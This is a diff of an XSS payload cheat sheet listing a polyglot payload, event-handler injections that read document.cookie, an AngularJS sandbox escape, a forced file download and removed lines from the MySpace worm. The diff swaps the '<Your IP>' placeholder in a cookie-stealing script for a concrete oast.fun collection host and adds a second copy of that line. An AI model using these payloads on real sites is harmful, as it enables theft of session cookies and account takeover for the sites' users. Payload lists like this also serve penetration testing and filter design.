@@ -1,9 +1,5 @@
-XSS Payloads
-
 The Ultimate
-
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-
 
 Links 
 https://github.com/payloadbox/xss-payload-list
@@ -17,7 +13,7 @@ https://netsec.expert/posts/xss-in-2020/
 
 <img src="" onerror="alert(document.cookie)" />
 
-<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>
+<input type="text" name="username" value="sense" onfocus=alert(document.cookie) autofocus "" width=50px>
 
 <span style="color: red"> Github </span>
 
@@ -27,14 +23,6 @@ https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
 [$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
 ()}}zzzz
 MORAL: Search for sandbox escape payloads
-
-From Samy's MySpace worm
-<div style="background:url('javascript:alert(1)')">
-eval('xmlhttp.onread' + 'ystatechange = callback');
-<div
-    id="mycode" expr="alert('hah!')"
-    style="background:url('javascript:eval(document.all.mycode.expr)')"
->
 
 // attacker input to innerHTML
 <img src="test.jpg" alt="``onload=xss()" />
@@ -63,8 +51,9 @@ the expression. For example:
 https://d3adend.org/xss/ghettoBypass
 
 Cookie Stealing XSS: 
-<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>
+<script>document.write('<img src="http://dzzwolliujyjdurzfshmn1wh36t7vzx9c.oast.fun/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>
 
+<script>document.write('<img src="http://dzzwolliujyjdurzfshmn1wh36t7vzx9c.oast.fun/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>
 Forcing the Download of a File: 
 <script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
 link.download = ''; document.body.appendChild(link); link.click();
@@ -76,7 +65,7 @@ Redirecting User:
 Other Scripts to Enable Key Loggers, Take Pictures, and More
 http://www.xss-payloads.com/payloads-list.html?c#category=capture
 
-<b onmouseover=alert('XSS')>Click Me!</b>
+<b onmouseover=alert('NoOnes')>Click Me!</b>
 <svg onload=alert(1)>
 <body onload="alert('XSS')">
 <img src="http://test.cyberspacekittens.com"
